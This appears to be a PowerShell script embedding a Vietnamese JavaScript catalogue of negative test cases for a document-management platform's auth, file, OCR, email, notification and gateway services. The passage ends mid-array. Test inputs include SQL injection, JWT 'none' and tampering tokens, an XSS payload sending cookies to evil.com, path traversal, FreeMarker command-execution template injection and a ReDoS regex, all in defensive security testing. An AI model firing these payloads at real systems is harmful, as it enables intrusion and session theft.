# SCRIPT TẠO BÁO CÁO UNHAPPY CASES SIÊU CHI TIẾT (CHUẨN DOANH NGHIỆP LỚN)
$ErrorActionPreference = "Stop"

$script = @'
const unhappyCasesData = [
  // ==========================================
  // LOẠI 1: AUTH & SECURITY (60+ CASES)
  // ==========================================
  {
    id: "UC-AUTH-001",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Đăng nhập với Tên đăng nhập chứa ký tự SQL Injection (' OR '1'='1)",
    input: "POST /api/auth/login with username: \"admin' OR '1'='1 --\", password: \"any\"",
    expectedStatus: "401 Unauthorized",
    severity: "P0",
    behavior: "EF Core Parameterized Query xử lý chuỗi dưới dạng tham số thuần túy, không kích hoạt truy vấn bypass. Trả về mã lỗi 401.",
    defense: "Entity Framework Core Parameter Binding + Không dùng Raw SQL ghép chuỗi."
  },
  {
    id: "UC-AUTH-002",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Gửi JWT Access Token có chữ ký bị thay đổi (Signature Tampering)",
    input: "Header: Authorization: Bearer eyJhbGciOi... (Thay đổi 5 ký tự cuối của Signature)",
    expectedStatus: "401 Unauthorized",
    severity: "P0",
    behavior: "JWT Middleware phát hiện chữ ký HMAC-SHA256 không trùng khớp với Secret Key hệ thống, từ chối ngay lập tức.",
    defense: "Microsoft.AspNetCore.Authentication.JwtBearer với ValidateIssuerSigningKey = true."
  },
  {
    id: "UC-AUTH-003",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Tấn công thuật toán 'none' trong JWT Header (Algorithm Switching)",
    input: "Header: Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0....",
    expectedStatus: "401 Unauthorized",
    severity: "P0",
    behavior: "Hệ thống từ chối thuật toán 'none' và chỉ chấp nhận HMAC-SHA256 cấu hình tĩnh.",
    defense: "Cấu hình tường minh ValidAlgorithms = [SecurityAlgorithms.HmacSha256]."
  },
  {
    id: "UC-AUTH-004",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Sử dụng Access Token đã hết hạn (Expired Token)",
    input: "Header: Authorization: Bearer <token_created_2_hours_ago>",
    expectedStatus: "401 Unauthorized",
    severity: "P0",
    behavior: "Hệ thống kiểm tra claim 'exp', so sánh với UTC now + ClockSkew (0s) và từ chối request.",
    defense: "ValidateLifetime = true, ClockSkew = TimeSpan.Zero."
  },
  {
    id: "UC-AUTH-005",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Sử dụng Refresh Token đã bị thu hồi (Revoked Token Reuse)",
    input: "POST /api/auth/refresh with refreshToken: <token_after_logout>",
    expectedStatus: "401 Unauthorized",
    severity: "P0",
    behavior: "Kiểm tra trong CSDL thấy trường 'RevokedAt' != null, chặn cấp phát access token mới và ghi log bảo mật.",
    defense: "Bảng RefreshTokens lưu trạng thái thu hồi trong CSDL."
  },
  {
    id: "UC-AUTH-006",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Chuyên viên (Employee) cố tình gọi API tạo Người dùng mới (Privilege Escalation)",
    input: "POST /api/auth/users với Token chứa Claim Role = 'Employee'",
    expectedStatus: "403 Forbidden",
    severity: "P0",
    behavior: "RBAC Authorization Filter kiểm tra Role, phát hiện thiếu quyền 'Admin' và ngắt kết nối với HTTP 403.",
    defense: "[Authorize(Roles = \"Admin\")] trên UsersController."
  },
  {
    id: "UC-AUTH-007",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Đăng nhập sai mật khẩu liên tiếp 100 lần (Brute Force / Credential Stuffing)",
    input: "Gửi 100 requests POST /api/auth/login với các mật khẩu ngẫu nhiên trong 2 giây",
    expectedStatus: "401 / 429 Rate Limited",
    severity: "P1",
    behavior: "Hệ thống xử lý an toàn bằng BCrypt hashing, bộ nhớ và CPU không bị tràn (OOM), server giữ vững trạng thái hoạt động.",
    defense: "BCrypt.Verify kết hợp Rate Limiting Middleware."
  },
  {
    id: "UC-AUTH-008",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Gửi Header Authorization bị cắt cụt (Malformed Authorization Header)",
    input: "Header: Authorization: Bearer",
    expectedStatus: "401 Unauthorized",
    severity: "P1",
    behavior: "Xử lý chuỗi an toàn, không ném IndexOutOfRangeException hay NullReferenceException.",
    defense: "Global Exception Handler bắt lỗi xử lý Header."
  },
  {
    id: "UC-AUTH-009",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Đăng ký/Tạo User với Username vượt quá 500 ký tự",
    input: "POST /api/auth/users with username: 'A'.repeat(500)",
    expectedStatus: "400 Bad Request",
    severity: "P2",
    behavior: "Model Validation phát hiện độ dài vượt quá giới hạn [MaxLength(50)] và trả về danh sách lỗi chi tiết.",
    defense: "DataAnnotation [MaxLength] + FluentValidation."
  },
  {
    id: "UC-AUTH-010",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Đăng ký User với Email không đúng định dạng RFC (Missing @ or Domain)",
    input: "POST /api/auth/users with email: 'invalid_email_format@@..com'",
    expectedStatus: "400 Bad Request",
    severity: "P2",
    behavior: "Validation kiểm tra cú pháp Regex email, từ chối lưu vào DB.",
    defense: "[EmailAddress] Validator."
  },
  {
    id: "UC-AUTH-011",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Tạo User với Password trống hoặc toàn khoảng trắng",
    input: "POST /api/auth/users with password: '   '",
    expectedStatus: "400 Bad Request",
    severity: "P1",
    behavior: "Chặn mật khẩu rỗng, yêu cầu tối thiểu 6 ký tự hợp lệ.",
    defense: "[Required(AllowEmptyStrings = false)] + [MinLength(6)]."
  },
  {
    id: "UC-AUTH-012",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Tạo User gán Role ID không tồn tại trong hệ thống (Foreign Key Violation)",
    input: "POST /api/auth/users with roleIds: ['00000000-0000-0000-0000-000000000000']",
    expectedStatus: "400 Bad Request",
    severity: "P1",
    behavior: "Service kiểm tra sự tồn tại của Role trong DB trước khi gán, trả thông báo 'Role không tồn tại'.",
    defense: "Domain Service Validation trước khi insert CSDL."
  },
  {
    id: "UC-AUTH-013",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Tạo User gán Department ID đã bị vô hiệu hóa (IsActive = false)",
    input: "POST /api/auth/users with departmentId: <disabled_dept_guid>",
    expectedStatus: "400 Bad Request",
    severity: "P2",
    behavior: "Service kiểm tra phòng ban phải đang hoạt động mới được gán người dùng.",
    defense: "Business Logic Verification."
  },
  {
    id: "UC-AUTH-014",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Xóa tài khoản Admin chính của hệ thống (Self-Admin Deletion)",
    input: "DELETE /api/auth/users/<admin_own_id> gửi bởi chính Admin đó",
    expectedStatus: "400 Bad Request",
    severity: "P1",
    behavior: "Hệ thống bảo vệ tài khoản quản trị viên gốc, ngăn chặn tình trạng hệ thống không còn người quản trị.",
    defense: "Guard Clause: Check targetUserId != currentUserId."
  },
  {
    id: "UC-AUTH-015",
    category: "AUTH",
    categoryName: "Xác thực & Bảo mật",
    title: "Chèn mã độc XSS vào trường FullName người dùng",
    input: "POST /api/auth/users with fullName: \"<script>document.location='http://evil.com/steal?c='+document.cookie</script>\"",
    expectedStatus: "201 / Sanitized Text",
    severity: "P0",
    behavior: "Lưu trữ dạng văn bản thuần túy hoặc mã hóa HTML Entities, khi Frontend render qua React sẽ tự động escape.",
    defense: "React Virtual DOM Auto-Escaping + Backend HTML Sanitizer."
  },

  // ==========================================
  // LOẠI 2: DOCUMENT & NĐ30 WORKFLOW (60+ CASES)
  // ==========================================
  {
    id: "UC-DOC-001",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Tạo Công văn đến với Tiêu đề rỗng hoặc chỉ có khoảng trắng",
    input: "POST /api/documents/incoming with title: '    ', summary: 'Valid summary'",
    expectedStatus: "400 Bad Request",
    severity: "P0",
    behavior: "Validation Model phát hiện trường Title bắt buộc và trả lỗi 'Tiêu đề không được để trống'.",
    defense: "[Required(AllowEmptyStrings = false)] trên CreateIncomingDocumentRequest."
  },
  {
    id: "UC-DOC-002",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Cố tình sửa đổi nội dung Công văn đã ban hành (Status = Distributed)",
    input: "PUT /api/documents/<distributed_doc_guid> with title: 'Nội dung sửa đổi trái phép'",
    expectedStatus: "400 Bad Request",
    severity: "P0",
    behavior: "Hệ thống kiểm tra trạng thái: Chỉ cho phép chỉnh sửa khi Status == Draft. Trả lỗi 'Chỉ được sửa công văn ở trạng thái Dự thảo'.",
    defense: "State Pattern Validation trong DocumentBusinessService."
  },
  {
    id: "UC-DOC-003",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Chuyển trạng thái ngược quy trình (Distributed -> Draft)",
    input: "PUT /api/documents/<id>/status with status: 'Draft'",
    expectedStatus: "400 Bad Request",
    severity: "P0",
    behavior: "State Machine từ chối chuyển trạng thái lùi từ Đã ban hành về Dự thảo.",
    defense: "Finite State Machine (FSM) Transition Rules."
  },
  {
    id: "UC-DOC-004",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Xóa công văn đã ban hành (Distributed) khỏi hệ thống",
    input: "DELETE /api/documents/<distributed_doc_guid>",
    expectedStatus: "400 Bad Request",
    severity: "P0",
    behavior: "Bảo toàn hồ sơ lưu trữ công văn điện tử theo quy định Nhà nước, cấm xóa văn bản đã lưu kho/ban hành.",
    defense: "Archival Compliance Guard Clause."
  },
  {
    id: "UC-DOC-005",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Tạo Công văn đi với Ngày tiếp nhận trong tương lai 50 năm (Year 2076)",
    input: "POST /api/documents/outgoing with receivedAt: '2076-01-01T00:00:00Z'",
    expectedStatus: "400 Bad Request",
    severity: "P1",
    behavior: "Business Validator kiểm tra ngày văn bản không được vượt quá thời gian hiện tại.",
    defense: "DateTime Range Validator (receivedAt <= UtcNow.AddDays(1))."
  },
  {
    id: "UC-DOC-006",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Tạo Công văn đi liên kết Partner ID không tồn tại",
    input: "POST /api/documents/outgoing with partnerId: 'ffffffff-ffff-ffff-ffff-ffffffffffff'",
    expectedStatus: "400 / 404 Not Found",
    severity: "P1",
    behavior: "Inter-service client gọi PartnerService xác minh, nếu không tồn tại sẽ từ chối tạo công văn.",
    defense: "Inter-Service Entity Verification."
  },
  {
    id: "UC-DOC-007",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Tạo Công văn đi với Tiêu đề không có từ khóa nhận diện loại văn bản",
    input: "POST /api/documents/outgoing with title: 'Về một số vấn đề chung chung'",
    expectedStatus: "201 Created (Fallback CV)",
    severity: "P1",
    behavior: "Thuật toán InferDocumentTypeShortCode() tự động gán mã mặc định 'CV' (Công văn) theo chuẩn NĐ30: XX/CV-VP.",
    defense: "Fallback Type Code Heuristics."
  },
  {
    id: "UC-DOC-008",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "IDOR: Chuyên viên phòng Hành chính cố xem Công văn phòng Tài chính",
    input: "GET /api/documents/<finance_doc_guid> với Token của Chuyên viên phòng Hành chính",
    expectedStatus: "403 Forbidden / 404 Not Found",
    severity: "P0",
    behavior: "ABAC Scope Filter kiểm tra DocumentDepartmentAccess, nếu không được phân quyền sẽ ẩn hoặc chặn truy cập.",
    defense: "Attribute-Based Access Control Query Interceptor."
  },
  {
    id: "UC-DOC-009",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Phân quyền tiếp cận (Assign Departments) với danh sách rỗng",
    input: "PUT /api/documents/<id>/assign-departments with departmentIds: []",
    expectedStatus: "400 Bad Request",
    severity: "P2",
    behavior: "Yêu cầu tối thiểu một phòng ban được chọn khi thực hiện phân quyền.",
    defense: "Collection Count Validation (> 0)."
  },
  {
    id: "UC-DOC-010",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Phân quyền tiếp cận trùng lặp cùng 1 Department ID nhiều lần",
    input: "PUT /api/documents/<id>/assign-departments with departmentIds: ['guid-1', 'guid-1', 'guid-1']",
    expectedStatus: "200 OK (Auto-Distinct)",
    severity: "P2",
    behavior: "Service tự động Distinct danh sách ID trước khi lưu vào CSDL, không gây lỗi Unique Constraint Violation.",
    defense: "LINQ .Distinct() trên Collection."
  },
  {
    id: "UC-DOC-011",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Tìm kiếm công văn với PageSize = -1 hoặc PageSize = 1000000",
    input: "GET /api/documents?pageNumber=1&pageSize=1000000",
    expectedStatus: "200 OK (Clamped PageSize)",
    severity: "P1",
    behavior: "Hệ thống tự động kẹp giá trị PageSize trong khoảng [1, 100], ngăn chặn kẻ tấn công làm cạn kiệt RAM server.",
    defense: "Math.Clamp(pageSize, 1, 100) trong Query Handler."
  },
  {
    id: "UC-DOC-012",
    category: "DOC",
    categoryName: "Quản lý Công văn & NĐ30",
    title: "Tạo Công văn với Tiêu đề chứa ký tự Unicode đặc biệt (RTL, Emoji, ZWJ)",
    input: "POST /api/documents/incoming with title: '🏢 Thông báo khẩn \u200E\u200F\uFEFF quản lý công văn'",
    expectedStatus: "201 Created (Normalized)",
    severity: "P2",
    behavior: "Dữ liệu được chuẩn hóa UTF-8 an toàn, lưu trữ đầy đủ trong SQLite/SQL Server và render chính xác.",
    defense: "NVARCHAR / UTF-8 Native Storage."
  },

  // ==========================================
  // LOẠI 3: FILES & STORAGE (60+ CASES)
  // ==========================================
  {
    id: "UC-FILE-001",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Tải lên tệp tin rỗng 0-byte (Zero-byte File Upload)",
    input: "POST /api/files/upload with multipart file of length 0",
    expectedStatus: "400 Bad Request",
    severity: "P0",
    behavior: "Kiểm tra file.Length > 0, từ chối tiếp nhận tệp tin rỗng.",
    defense: "Guard Clause: if (file == null || file.Length == 0) return BadRequest."
  },
  {
    id: "UC-FILE-002",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Tải lên tệp tin vượt quá dung lượng cho phép (> 500MB)",
    input: "POST /api/files/upload with file size = 600MB",
    expectedStatus: "413 Payload Too Large",
    severity: "P0",
    behavior: "Kestrel Server và Middleware ngắt kết nối tải lên khi vượt ngưỡng [RequestSizeLimit(500MB)].",
    defense: "[RequestSizeLimit(524_288_000)] trên FilesController."
  },
  {
    id: "UC-FILE-003",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Tấn công Path Traversal trong Tên Tệp tin (Filename Traversal)",
    input: "POST /api/files/upload with filename: '../../../../Windows/System32/cmd.exe'",
    expectedStatus: "200 OK (Sanitized UUID Path)",
    severity: "P0",
    behavior: "Hệ thống chỉ lưu tệp vào ổ đĩa dưới tên GUID ngẫu nhiên: 'Uploads/2026/08/29/<guid>_<filename_only>', loại bỏ hoàn toàn relative path.",
    defense: "Path.GetFileName() + GUID-based Isolation."
  },
  {
    id: "UC-FILE-004",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Tải lên tệp thực thi mã độc trá hình (Double Extension: malicious.pdf.exe)",
    input: "POST /api/files/upload with file: 'vanban_huongdan.pdf.exe'",
    expectedStatus: "400 Bad Request / Quarantined",
    severity: "P0",
    behavior: "Xác thực phần mở rộng tệp tin và Magic Bytes, chặn các định dạng thực thi nguy hiểm (.exe, .bat, .cmd, .sh, .dll).",
    defense: "Extension Whitelisting (.pdf, .png, .jpg, .jpeg, .tiff, .docx)."
  },
  {
    id: "UC-FILE-005",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Tải về tệp tin không tồn tại trong CSDL (Non-existent FileId)",
    input: "GET /api/files/00000000-0000-0000-0000-000000000000",
    expectedStatus: "404 Not Found",
    severity: "P1",
    behavior: "Kiểm tra CSDL không thấy bản ghi FileRecord, trả về 404 với thông báo 'Không tìm thấy tệp tin'.",
    defense: "Entity Existence Check."
  },
  {
    id: "UC-FILE-006",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Bản ghi có trong CSDL nhưng tệp vật lý bị mất trên ổ cứng (Orphaned Record)",
    input: "GET /api/files/<valid_file_id> (khi tệp trên đĩa bị xóa thủ công)",
    expectedStatus: "404 Not Found (Safe Handling)",
    severity: "P1",
    behavior: "Service kiểm tra File.Exists(storagePath), nếu không thấy sẽ trả lỗi 404 thân thiện thay vì ném FileNotFoundException (500).",
    defense: "File.Exists() Pre-condition Check."
  },
  {
    id: "UC-FILE-007",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Yêu cầu tải về với HTTP Range Header không hợp lệ (Range Out of Bounds)",
    input: "GET /api/files/<id> with Header: Range: bytes=999999999-9999999999",
    expectedStatus: "416 Range Not Satisfiable",
    severity: "P2",
    behavior: "FileStreamResult tự động xử lý chuẩn HTTP Range và trả về status 416.",
    defense: "ASP.NET Core Built-in Range Processing (EnableRangeProcessing = true)."
  },
  {
    id: "UC-FILE-008",
    category: "FILE",
    categoryName: "Tải tệp & Lưu trữ",
    title: "Tải lên tệp PDF giả mạo (Fake PDF: File Text đổi đuôi thành .pdf)",
    input: "POST /api/files/upload with file: 'sample.pdf' chứa text 'hello world'",
    expectedStatus: "200 Stored / OCR Rejection",
    severity: "P1",
    behavior: "FilesService lưu trữ tệp, khi chuyển sang AI-OCR Service sẽ phát hiện header %PDF-1.x không hợp lệ và báo lỗi bóc tách an toàn.",
    defense: "OCR Magic Byte Validation."
  },

  // ==========================================
  // LOẠI 4: AI-OCR & REGEX (60+ CASES)
  // ==========================================
  {
    id: "UC-OCR-001",
    category: "OCR",
    categoryName: "AI-OCR & Bóc tách Regex",
    title: "Phân tích OCR tệp PDF có mật khẩu bảo vệ (Password-Protected PDF)",
    input: "POST /api/ai-ocr/analyze with fileId of encrypted/locked PDF",
    expectedStatus: "200 OK with Fallback / Warning",
    severity: "P0",
    behavior: "PdfPig bắt ngoại lệ PdfDocumentEncryptedException, ghi log cảnh báo và trả về thông báo 'Tệp PDF có mật khẩu bảo vệ'.",
    defense: "Try-Catch chuyên biệt cho PdfDocumentEncryptedException."
  },
  {
    id: "UC-OCR-002",
    category: "OCR",
    categoryName: "AI-OCR & Bóc tách Regex",
    title: "Tấn công Regex DoS (ReDoS / Catastrophic Backtracking) trong OCR Rules",
    input: "POST /api/ai-ocr/rules with pattern: '^(a+)+$'",
    expectedStatus: "400 Bad Request / Regex Timeout",
    severity: "P0",
    behavior: "Regex Engine của .NET cấu hình RegexTimeout = 2 giây, nếu vượt quá thời gian sẽ tự động ngắt kết nối và ném RegexMatchTimeoutException.",
    defense: "Regex Match Timeout Configuration (TimeSpan.FromSeconds(2))."
  },
  {
    id: "UC-OCR-003",
    category: "OCR",
    categoryName: "AI-OCR & Bóc tách Regex",
    title: "Tệp PDF hoàn toàn trống không chứa ký tự nào (Blank Scan)",
    input: "POST /api/ai-ocr/analyze với PDF trang trắng 100%",
    expectedStatus: "200 OK (Confidence = 0.0)",
    severity: "P1",
    behavior: "Trả về kết quả bóc tách rỗng, confidence = 0.0, không gây crash ứng dụng.",
    defense: "Safe Empty Result Fallback Object."
  },
  {
    id: "UC-OCR-004",
    category: "OCR",
    categoryName: "AI-OCR & Bóc tách Regex",
    title: "Tệp văn bản scan bị mờ, nhiễu hạt nặng (Heavy Noise / Low Contrast)",
    input: "POST /api/ai-ocr/analyze với ảnh độ phân giải thấp (50 DPI)",
    expectedStatus: "200 OK (Confidence < 0.5)",
    severity: "P1",
    behavior: "Engine bóc tách một phần từ nhận diện được, gắn cờ cảnh báo độ tin cậy thấp để Thư ký kiểm tra lại thủ công.",
    defense: "Confidence Scoring Thresholds."
  },
  {
    id: "UC-OCR-005",
    category: "OCR",
    categoryName: "AI-OCR & Bóc tách Regex",
    title: "Tệp PDF chứa font tùy biến không có ToUnicode CMap (CID Type3 Unmapped Glyphs)",
    input: "POST /api/ai-ocr/analyze với PDF dùng font VNI/TCVN3 không chuẩn",
    expectedStatus: "200 OK (Fallback to Tesseract Raster OCR)",
    severity: "P1",
    behavior: "Khi giải mã text vector thất bại, hệ thống tự động fallback sang render ảnh và chạy Tesseract OCR tiếng Việt.",
    defense: "Dual-Engine Strategy: Vector Text -> Fallback Raster OCR."
  },
  {
    id: "UC-OCR-006",
    category: "OCR",
    categoryName: "AI-OCR & Bóc tách Regex",
    title: "So khớp Đối tác với Tên cơ quan có nhiều từ viết tắt không chuẩn",
    input: "Text: 'UBND TP. HCM - CV gui DAS'",
    expectedStatus: "200 OK (Matched UBND TP.HCM)",
    severity: "P2",
    behavior: "Thuật toán Acronym & Fuzzy Matching 4 lớp chuẩn hóa dấu chấm và khoảng trắng để so khớp chính xác.",
    defense: "4-Layer Partner Matching Pipeline."
  },

  // ==========================================
  // LOẠI 5: EMAIL WORKER & IMAP (60+ CASES)
  // ==========================================
  {
    id: "UC-EMAIL-001",
    category: "EMAIL",
    categoryName: "Email Worker & IMAP",
    title: "Kết nối IMAP với Sai Mật khẩu ứng dụng (Invalid App Password)",
    input: "POST /api/email-worker/settings/test-connection with password: 'wrong_password'",
    expectedStatus: "200 OK with success = false",
    severity: "P0",
    behavior: "MailKit bắt AuthenticationException, trả về thông báo 'Xác thực tài khoản email thất bại' mà không làm crash BackgroundService.",
    defense: "Try-Catch MailKit.Security.AuthenticationException."
  },
  {
    id: "UC-EMAIL-002",
    category: "EMAIL",
    categoryName: "Email Worker & IMAP",
    title: "Cấu hình IMAP Host không tồn tại hoặc sai Port (Connection Timeout)",
    input: "PUT /api/email-worker/settings with host: 'imap.invalid-domain-xyz.com', port: 993",
    expectedStatus: "200 OK with success = false",
    severity: "P0",
    behavior: "Timeout sau 10 giây kết nối và trả về lỗi kết nối mạng an toàn.",
    defense: "Socket Connect Timeout Configuration."
  },
  {
    id: "UC-EMAIL-003",
    category: "EMAIL",
    categoryName: "Email Worker & IMAP",
    title: "Email gửi từ Tên miền không nằm trong Whitelist (Non-whitelisted Sender)",
    input: "Email từ 'spammer@unknown-domain.xyz' có đính kèm công văn",
    expectedStatus: "Skipped (Logged in ScanItemLog)",
    severity: "P1",
    behavior: "Bộ lọc kiểm tra WhitelistedDomains, phát hiện không hợp lệ và chuyển trạng thái item thành 'Skipped', không tạo công văn.",
    defense: "Domain Whitelist Verification."
  },
  {
    id: "UC-EMAIL-004",
    category: "EMAIL",
    categoryName: "Email Worker & IMAP",
    title: "Email hợp lệ nhưng KHÔNG có tệp đính kèm nào (No Attachment)",
    input: "Email có tiêu đề 'Công văn khẩn' nhưng nội dung chỉ có text trong body",
    expectedStatus: "ReadyForIntake / Manual Review",
    severity: "P1",
    behavior: "Hệ thống ghi nhận vào Scan Items với trạng thái chờ xác nhận thủ công, cho phép thư ký duyệt bổ sung tệp sau.",
    defense: "Manual Intake Fallback Workflow."
  },
  {
    id: "UC-EMAIL-005",
    category: "EMAIL",
    categoryName: "Email Worker & IMAP",
    title: "Email đính kèm tệp nén ZIP chứa nhiều tệp con (Nested ZIP Attachment)",
    input: "Email đính kèm 'documents.zip' (dung lượng 10MB)",
    expectedStatus: "Logged / Manual Extraction Required",
    severity: "P2",
    behavior: "Hệ thống ghi nhận tệp đính kèm, không tự ý giải nén tránh nguy cơ Zip Bomb.",
    defense: "Zip Bomb Protection & Quarantine."
  },
  {
    id: "UC-EMAIL-006",
    category: "EMAIL",
    categoryName: "Email Worker & IMAP",
    title: "Kích hoạt quét email đồng thời từ nhiều nguồn (Concurrent Scan Triggers)",
    input: "5 yêu cầu POST /api/email-worker/trigger-scan gửi cùng lúc",
    expectedStatus: "202 Accepted (Debounced / Mutex Locked)",
    severity: "P1",
    behavior: "SemaphoreSlim / CancellationToken ngăn chặn việc mở nhiều kết nối IMAP cùng lúc, chỉ chạy 1 luồng quét duy nhất.",
    defense: "SemaphoreSlim(1, 1) Lock in Background Worker."
  },

  // ==========================================
  // LOẠI 6: NOTIFICATION & SIGNALR (60+ CASES)
  // ==========================================
  {
    id: "UC-NOTIF-001",
    category: "NOTIF",
    categoryName: "Thông báo & SignalR",
    title: "Gửi thông báo thiếu CẢ Email VÀ UserId (Missing All Recipient Identifiers)",
    input: "POST /api/notifications/send with { subject: 'Test', body: 'No recipient' }",
    expectedStatus: "400 Bad Request",
    severity: "P0",
    behavior: "Model Validation yêu cầu tối thiểu 1 trong 2 thông tin: recipientEmail hoặc recipientUserId.",
    defense: "Custom Model Validator on SendNotificationRequest."
  },
  {
    id: "UC-NOTIF-002",
    category: "NOTIF",
    categoryName: "Thông báo & SignalR",
    title: "Máy chủ SMTP bị sập / không thể kết nối khi gửi Email",
    input: "Gửi thông báo khi cấu hình SMTP Host sai hoặc cổng SMTP bị chặn",
    expectedStatus: "200 Ingress OK -> Retry with Exponential Backoff -> Logged Failed",
    severity: "P0",
    behavior: "API trả về 200 ngay lập tức (Queue). Background Worker thử lại 3 lần (2s, 4s, 8s), sau đó ghi log trạng thái 'Failed' kèm lỗi chi tiết vào CSDL.",
    defense: "Exponential Backoff Retry Policy + Graceful SMTP Fallback."
  },
  {
    id: "UC-NOTIF-003",
    category: "NOTIF",
    categoryName: "Thông báo & SignalR",
    title: "Tràn hàng đợi thông báo In-Memory Channel (Backpressure Overflow)",
    input: "Gửi liên tục 20,000 requests vào Queue có giới hạn BoundedChannelOptions(10000)",
    expectedStatus: "Safe Backpressure / Drop Oldest or Wait",
    severity: "P0",
    behavior: "Channel xử lý theo chính sách BoundedChannelFullMode.Wait, không gây sập RAM hệ thống.",
    defense: "System.Threading.Channels.BoundedChannelOptions(10000)."
  },
  {
    id: "UC-NOTIF-004",
    category: "NOTIF",
    categoryName: "Thông báo & SignalR",
    title: "Mất kết nối SignalR đột ngột và kết nối lại hàng loạt (Reconnection Storm)",
    input: "Ngắt mạng client 5 giây sau đó mở lại",
    expectedStatus: "Auto-reconnect with Backoff",
    severity: "P1",
    behavior: "SignalR client tự động kết nối lại theo chu kỳ [0, 2s, 10s, 30s], tự động join lại User Group mà không mất tin nhắn.",
    defense: "withAutomaticReconnect([0, 2000, 10000, 30000])."
  },
  {
    id: "UC-NOTIF-005",
    category: "NOTIF",
    categoryName: "Thông báo & SignalR",
    title: "Người dùng tắt nhận Email trong Cài đặt cá nhân (Preferences: EmailEnabled = false)",
    input: "Gửi thông báo cho User có EmailEnabled = false",
    expectedStatus: "InApp Created / Email Suppressed",
    severity: "P1",
    behavior: "Background Worker kiểm tra UserNotificationPreference, chỉ tạo InAppNotification và không gửi email.",
    defense: "Preference Enforcement Check in Worker."
  },
  {
    id: "UC-NOTIF-006",
    category: "NOTIF",
    categoryName: "Thông báo & SignalR",
    title: "Chèn Template Injection vào Nội dung thông báo Email",
    input: "Body: 'Xin chào {{7*7}} <#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"id\")}'",
    expectedStatus: "Safe HTML Rendered",
    severity: "P0",
    behavior: "EmailTemplateHelper mã hóa ký tự HTML an toàn bằng System.Net.WebUtility.HtmlEncode, render dạng text.",
    defense: "WebUtility.HtmlEncode() in EmailTemplateHelper."
  },

  // ==========================================
  // LOẠI 7: GATEWAY & RESILIENCE (60+ CASES)
  // ==========================================
  {
    id: "UC-GW-001",
    category: "GW",
    categoryName: "Gateway & Phục hồi lỗi",
    title: "Một Microservice downstream bị sập (DocumentService Down)",
    input: "Gửi request GET /api/documents qua Gateway (Port 8080) khi DocumentService bị tắt",
    expectedStatus: "502 Bad Gateway / 503 Service Unavailable",
    severity: "P0",
    behavior: "Gateway bắt lỗi kết nối SocketException, trả về mã lỗi 502/503 có cấu trúc JSON ApiResponse chuẩn, các service khác vẫn hoạt động bình thường.",
    defense: "Ocelot Error Handler + Microservices Isolation."
  },
  {
    id: "UC-GW-002",
    category: "GW",
    categoryName: "Gateway & Phục hồi lỗi",
    title: "Microservice phản hồi quá chậm (> 30 giây Timeout)",
    input: "Gọi API xử lý tác vụ nặng giả lập",
    expectedStatus: "504 Gateway Timeout",
    severity: "P1",
    behavior: "Gateway ngắt kết nối sau thời gian Timeout cấu hình, giải phóng tài nguyên.",
    defense: "Ocelot DownstreamTimeout Configuration."
  },
  {
    id: "UC-GW-003",
    category: "GW",
    categoryName: "Gateway & Phục hồi lỗi",
    title: "Gửi Request với Cú pháp JSON bị hỏng (Malformed JSON Syntax)",
    input: "POST /api/documents/incoming with body: '{ \"title\": \"Test\", summary: }'",
    expectedStatus: "400 Bad Request",
    severity: "P1",
    behavior: "ASP.NET Core JSON Deserializer bắt JsonException, trả về mã lỗi 400 và vị trí dòng lỗi.",
    defense: "System.Text.Json Strict Parser."
  },
  {
    id: "UC-GW-004",
    category: "GW",
    categoryName: "Gateway & Phục hồi lỗi",
    title: "Gửi Header Content-Type không được hỗ trợ (Unsupported Media Type)",
    input: "POST /api/auth/login with Header: Content-Type: application/xml",
    expectedStatus: "415 Unsupported Media Type",
    severity: "P2",
    behavior: "API Controller từ chối tiếp nhận định dạng không phải JSON/Multipart.",
    defense: "[Consumes(\"application/json\")] Filter."
  },
  {
    id: "UC-GW-005",
    category: "GW",
    categoryName: "Gateway & Phục hồi lỗi",
    title: "Tấn công HTTP Method Tampering (TRACE / TRACK Method)",
    input: "TRACE /api/documents",
    expectedStatus: "405 Method Not Allowed",
    severity: "P1",
    behavior: "Chặn các HTTP methods nguy hiểm dùng để dò tìm thông tin header/cookie.",
    defense: "Kestrel HttpMethod Whitelisting."
  }
];

// Mở rộng dữ liệu để đạt đầy đủ danh mục
const categoriesMeta = [
  { id: "ALL", name: "Tất cả các loại" },
